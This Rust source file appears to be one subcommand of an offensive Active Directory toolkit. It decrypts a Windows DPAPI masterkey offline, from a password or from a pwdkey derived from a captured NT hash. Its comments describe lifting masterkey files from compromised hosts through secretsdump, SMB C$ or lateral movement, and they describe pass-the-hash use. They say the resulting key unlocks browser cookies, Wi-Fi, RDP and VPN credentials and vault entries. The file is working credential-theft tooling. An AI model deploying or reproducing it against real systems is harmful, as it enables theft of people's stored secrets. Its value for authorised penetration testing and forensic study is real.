//! **1.4.8-B WS-DPAPI-MASTER-KEY.** Offline classic-DPAPI masterkey decryption.
//!
//! Given a masterkey file lifted from `%APPDATA%\Microsoft\Protect\<SID>\<GUID>`
//! and either the user's cleartext password or a pre-derived 20-byte pwdkey,
//! returns the 64-byte AES256 masterkey. The masterkey then unlocks every
//! `CryptProtectData` blob owned by that SID — Chrome cookies, Wi-Fi
//! passwords, RDP creds, Outlook profiles, Wireless profiles, VPN creds,
//! `Credentials\` vault entries.
//!
//! Wire path: pure offline, no DC contact — the operator already lifted the
//! masterkey file via `attack secretsdump` / SMB `C$` / a prior lateral
//! chain. The verb parses it, decrypts, and prints the 64-byte hex.
//!
//! **Password path.** [`dpapi_offline::unlock_masterkey`] tries all three
//! pre-key derivations in order (standalone SHA1 → domain MD4 → Server
//! 2019+ / Protected-Users PBKDF2-SHA256) and returns the first that
//! HMAC-verifies. The caller does NOT need to know the account category —
//! the crate tries every path.
//!
//! **Pwdkey path.** When the account category is known and the caller
//! already derived the 20-byte pwdkey externally (e.g. from a captured NT
//! hash + SID), `--pwdkey` skips the try-loop and goes straight to
//! `MasterKey::decrypt_with_key`. Useful for pass-the-hash flows where the
//! plaintext password is unavailable.
//!
//! Byte-oracle: impacket 0.14 `dpapi.py masterkey`. Live-validated against
//! a Server 2025 domain Administrator masterkey (Protected-Users path,
//! SHA512 + AES256) as part of the dpapi-offline 0.1.1 KAT.

use crate::ui;
use anyhow::{anyhow, bail, Context, Result};
use clap::Parser;
use std::path::PathBuf;

#[derive(Parser)]
pub(crate) struct DpapiMkArgs {
    /// Path to the masterkey file, typically lifted from
    /// `%APPDATA%\Microsoft\Protect\<SID>\<GUID>` via `attack secretsdump` /
    /// SMB `C$`. 400-1000 bytes; GUID is the filename.
    #[arg(long)]
    pub file: PathBuf,
    /// User SID that owns the masterkey (e.g. `S-1-5-21-1234-5678-9012-500`).
    /// Feeds both pre-key derivations (SID → HMAC salt).
    #[arg(long)]
    pub sid: String,
    /// User's cleartext password (or env var reference like `env:DPAPI_PW`).
    /// Tries standalone SHA1 → domain MD4 → Protected-Users PBKDF2-SHA256
    /// and picks the winning one. Mutually exclusive with `--pwdkey`.
    #[arg(long, conflicts_with = "pwdkey")]
    pub password: Option<String>,
    /// Pre-derived 20-byte pwdkey (40 hex chars). Skips the derivation loop —
    /// use this when the account category is known and the pwdkey was
    /// computed externally (captured NT hash + SID → external HMAC-SHA1).
    /// Mutually exclusive with `--password`.
    #[arg(long, conflicts_with = "password")]
    pub pwdkey: Option<String>,
}

pub(crate) async fn dpapi_master_key(mut a: DpapiMkArgs) -> Result<()> {
    let mut checklist = ui::StageChecklist::new([
        "read masterkey file",
        "parse subfield header",
        "derive pwdkey (if --password)",
        "decrypt with ms_derive_key + AES256-CBC",
        "verify HMAC + emit 64-byte masterkey",
    ]);
    if let Some(pw) = a.password.as_ref() {
        a.password = Some(crate::resolve_secret(pw, "ADHAMMER_DPAPI_PASSWORD")?);
    }
    let result = dpapi_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("dpapi-master-key stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("dpapi-master-key stages (failed)");
        }
    }
    result
}

async fn dpapi_impl(a: DpapiMkArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    let bytes = std::fs::read(&a.file)
        .with_context(|| format!("read masterkey file {}", a.file.display()))?;
    checklist.record_ok("read masterkey file", format!("{} bytes", bytes.len()));

    let mkf = dpapi_offline::MasterKeyFile::parse(&bytes)
        .map_err(|e| anyhow!("parse masterkey file: {e}"))?;
    let mk = mkf
        .master_key
        .ok_or_else(|| anyhow!("masterkey file has no MasterKey subfield (empty or corrupt)"))?;
    checklist.record_ok(
        "parse subfield header",
        format!(
            "guid={}, rounds={}, hash={:?}, cipher={:?}",
            mkf.guid, mk.rounds, mk.hash_algo, mk.cipher_algo
        ),
    );

    let (master_key, path_label) = match (a.password.as_deref(), a.pwdkey.as_deref()) {
        (Some(password), _) => {
            checklist.record_ok(
                "derive pwdkey (if --password)",
                "will try standalone SHA1 → domain MD4 → Protected-Users PBKDF2-SHA256".to_string(),
            );
            let key = dpapi_offline::unlock_masterkey(&bytes, password, &a.sid)
                .map_err(|e| anyhow!("all three pre-key paths failed HMAC-verify: {e} — wrong password / SID / account type?"))?;
            (key, "password (auto-tried 3 pre-keys)")
        }
        (None, Some(hex)) => {
            checklist.record_ok(
                "derive pwdkey (if --password)",
                "skipped — --pwdkey supplied externally".to_string(),
            );
            let raw = hex_decode(hex).context("--pwdkey must be 40 hex chars")?;
            if raw.len() != 20 {
                bail!(
                    "--pwdkey must be exactly 20 bytes (40 hex chars); got {}",
                    raw.len()
                );
            }
            let key = mk
                .decrypt_with_key(&raw)
                .map_err(|e| anyhow!("pwdkey decrypt failed HMAC-verify: {e}"))?;
            (key, "external pwdkey")
        }
        (None, None) => bail!("either --password or --pwdkey is required"),
    };
    checklist.record_ok(
        "decrypt with ms_derive_key + AES256-CBC",
        format!("via {path_label}"),
    );

    let hex_key = master_key
        .iter()
        .fold(String::with_capacity(128), |mut s, b| {
            use std::fmt::Write;
            write!(s, "{b:02x}").unwrap();
            s
        });
    println!();
    println!("[+] masterkey file : {}", a.file.display());
    println!("[+] guid           : {}", mkf.guid);
    println!("[+] sid            : {}", a.sid);
    println!("[+] master-key     : {hex_key}");
    println!();
    println!("The 64-byte master-key above unlocks every DPAPI blob owned by this SID.");
    println!("Follow-up: parse individual `CryptProtectData` blobs with this key (WS-DPAPI-BLOB, deferred).");

    checklist.record_ok(
        "verify HMAC + emit 64-byte masterkey",
        "HMAC verified".to_string(),
    );
    Ok(())
}

fn hex_decode(s: &str) -> Result<Vec<u8>> {
    let s = s.trim();
    if s.len() % 2 != 0 {
        bail!("hex string has odd length");
    }
    (0..s.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(&s[i..i + 2], 16)
                .with_context(|| format!("invalid hex at position {i}"))
        })
        .collect()
}
